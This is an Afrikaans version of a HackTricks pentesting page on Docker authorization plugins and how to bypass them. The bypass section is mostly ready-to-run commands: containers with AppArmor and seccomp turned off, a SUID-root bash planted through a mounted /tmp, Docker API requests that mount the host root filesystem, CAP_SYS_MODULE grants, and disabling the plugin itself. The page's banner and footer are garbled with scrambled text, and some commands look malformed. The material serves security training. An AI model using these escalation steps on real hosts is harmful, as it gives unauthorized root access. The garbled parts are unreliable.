{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


**Docker se** out-of-the-box **autorisering** model is **alles of niks**. Enige gebruiker met toestemming om toegang tot die Docker daemon te verkry, kan **enige** Docker kliënt **opdrag** **uitvoer**. Dieselfde geld vir oproepers wat Docker se Engine API gebruik om die daemon te kontak. As jy **groter toegangbeheer** benodig, kan jy **autorisering plugins** skep en dit by jou Docker daemon konfigurasie voeg. Met 'n autorisering plugin kan 'n Docker administrateur **fyn toegang** beleid konfigureer om toegang tot die Docker daemon te bestuur.

# Basiese argitektuur

Docker Auth plugins is **eksterne** **plugins** wat jy kan gebruik om **toestaan/ontken** **aksies** wat aan die Docker Daemon aangevra word, **afhangende** van die **gebruiker** wat dit aangevra het en die **aksie** **aangevra**.

**[Die volgende inligting is van die dokumentasie](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Wanneer 'n **HTTP** **versoek** aan die Docker **daemon** gemaak word deur die CLI of via die Engine API, **gee** die **authentisering** **substelsel** die versoek aan die geïnstalleerde **authentisering** **plugin**(s). Die versoek bevat die gebruiker (oproeper) en opdrag konteks. Die **plugin** is verantwoordelik om te besluit of die versoek **toegestaan** of **ontken** moet word.

Die volgorde diagramme hieronder toon 'n toelaat en ontken autorisering vloei:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Elke versoek wat aan die plugin gestuur word, **sluit die geverifieerde gebruiker, die HTTP koptekste, en die versoek/antwoord liggaam** in. Slegs die **gebruikersnaam** en die **authentisering metode** wat gebruik is, word aan die plugin deurgegee. Die belangrikste is dat **geen** gebruikers **akkrediteer** of tokens deurgegee word nie. Laastens, **nie alle versoek/antwoord liggame word** aan die autorisering plugin gestuur nie. Slegs daardie versoek/antwoord liggame waar die `Content-Type` of `text/*` of `application/json` is, word gestuur.

Vir opdragte wat moontlik die HTTP verbinding kan oorneem (`HTTP Upgrade`), soos `exec`, word die autorisering plugin slegs vir die aanvanklike HTTP versoeke aangeroep. Sodra die plugin die opdrag goedkeur, word autorisering nie op die res van die vloei toegepas nie. Spesifiek, die stroomdata word nie aan die autorisering plugins deurgegee nie. Vir opdragte wat chunked HTTP antwoord teruggee, soos `logs` en `events`, word slegs die HTTP versoek aan die autorisering plugins gestuur.

Tydens versoek/antwoord verwerking, mag sommige autorisering vloei addisionele navrae aan die Docker daemon benodig. Om sulke vloei te voltooi, kan plugins die daemon API aanroep soos 'n gewone gebruiker. Om hierdie addisionele navrae moontlik te maak, moet die plugin die middele verskaf vir 'n administrateur om behoorlike authentisering en sekuriteitsbeleide te konfigureer.

## Verskeie Plugins

Jy is verantwoordelik vir **registrasie** van jou **plugin** as deel van die Docker daemon **opstart**. Jy kan **meerdere plugins installeer en dit saamketting**. Hierdie ketting kan georden word. Elke versoek aan die daemon gaan in volgorde deur die ketting. Slegs wanneer **alle plugins toegang verleen** tot die hulpbron, word die toegang verleen.

# Plugin Voorbeelde

## Twistlock AuthZ Broker

Die plugin [**authz**](https://github.com/twistlock/authz) laat jou toe om 'n eenvoudige **JSON** lêer te skep wat die **plugin** sal **lees** om die versoeke te autoriseer. Daarom gee dit jou die geleentheid om baie maklik te beheer watter API eindpunte elke gebruiker kan bereik.

Dit is 'n voorbeeld wat sal toelaat dat Alice en Bob nuwe houers kan skep: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

In die bladsy [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) kan jy die verhouding tussen die aangevraagde URL en die aksie vind. In die bladsy [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) kan jy die verhouding tussen die aksienaam en die aksie vind.

## Eenvoudige Plugin Handleiding

Jy kan 'n **maklik verstaanbare plugin** met gedetailleerde inligting oor installasie en foutopsporing hier vind: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Lees die `README` en die `plugin.go` kode om te verstaan hoe dit werk.

# Docker Auth Plugin Bypass

## Enumereer toegang

Die hoofsake om te kontroleer is die **watter eindpunte toegelaat word** en **watter waardes van HostConfig toegelaat word**.

Om hierdie enumerasie uit te voer, kan jy **die hulpmiddel** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## verbode `run --privileged`

### Minimum Privileges
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Running a container and then getting a privileged session

In this case the sysadmin **het gebruikers verbied om volumes te monteer en houers met die `--privileged` vlag te draai** of enige ekstra vermoë aan die houer te gee:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
However, a user can **create a shell inside the running container and give it the extra privileges**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Nou kan die gebruiker uit die houer ontsnap deur enige van die [**voorheen bespreekte tegnieke**](./#privileged-flag) te gebruik en **privileges te verhoog** binne die gasheer.

## Monteer Skryfbare Gids

In hierdie geval het die stelselaanvaarder **gebruikers verbied om houers met die `--privileged` vlag te laat loop** of enige ekstra vermoë aan die houer te gee, en hy het slegs toegelaat om die `/tmp` gids te monteer:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Let daarop dat jy dalk nie die gids `/tmp` kan monteer nie, maar jy kan 'n **ander skryfbare gids** monteer. Jy kan skryfbare gidse vind met: `find / -writable -type d 2>/dev/null`

**Let daarop dat nie al die gidse in 'n linux masjien die suid bit sal ondersteun nie!** Om te kyk watter gidse die suid bit ondersteun, voer `mount | grep -v "nosuid"` uit. Byvoorbeeld, gewoonlik ondersteun `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` en `/var/lib/lxcfs` nie die suid bit nie.

Let ook daarop dat as jy **`/etc`** of enige ander gids **wat konfigurasie lêers bevat**, kan **monteer**, jy dit as root vanuit die docker houer kan verander om dit te **misbruik in die gasheer** en voorregte te verhoog (miskien deur `/etc/shadow` te wysig).
{% endhint %}

## Onbeheerde API Eindpunt

Die verantwoordelikheid van die sysadmin wat hierdie plugin konfigureer, sal wees om te beheer watter aksies en met watter voorregte elke gebruiker kan uitvoer. Daarom, as die admin 'n **swartlys** benadering met die eindpunte en die eienskappe neem, mag hy dalk **van sommige daarvan vergeet** wat 'n aanvaller kan toelaat om **voorregte te verhoog.**

Jy kan die docker API nagaan in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Onbeheerde JSON Struktuur

### Bindings in root

Dit is moontlik dat toe die sysadmin die docker vuurmuur gekonfigureer het, hy **van 'n belangrike parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Bindings**" **vergeet het**.\
In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer te skep en te laat loop wat die root (/) gids van die gasheer monteer:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Let op hoe ons in hierdie voorbeeld die **`Binds`** parameter as 'n wortelvlak sleutel in die JSON gebruik, maar in die API verskyn dit onder die sleutel **`HostConfig`**
{% endhint %}

### Binds in HostConfig

Volg dieselfde instruksies as met **Binds in root** deur hierdie **aanvraag** aan die Docker API te doen:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

Volg dieselfde instruksies as met **Binds in root** deur hierdie **versoek** aan die Docker API te doen:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

Volg dieselfde instruksies as met **Binds in root** deur hierdie **versoek** aan die Docker API te doen:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Ongeëvalueerde JSON Attribuut

Dit is moontlik dat toe die stelselaanpasser die docker-vuurmuur gekonfigureer het, hy **vergeet het van 'n belangrike attribuut van 'n parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Capabilities**" binne "**HostConfig**". In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer met die **SYS\_MODULE** vermoë te skep en te laat loop:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
Die **`HostConfig`** is die sleutel wat gewoonlik die **interessante** **privileges** bevat om uit die houer te ontsnap. Dit is egter belangrik om te noem, soos ons voorheen bespreek het, dat die gebruik van Binds buite dit ook werk en jou mag toelaat om beperkings te omseil.
{% endhint %}

## Deaktiveer Plugin

As die **sisteemadministrateur** **vergeet** het om die vermoë om die **plugin** te **deaktiveer**, kan jy hiervan voordeel trek om dit heeltemal te deaktiveer!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Remember to **heraktiveer die plugin na die eskalering**, of 'n **herbegin van die docker diens sal nie werk nie**!

## Auth Plugin Bypass skrywes

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Verwysings
{% hnt stye="acceas" %}
AWS Ha& praktyk ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Leer & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
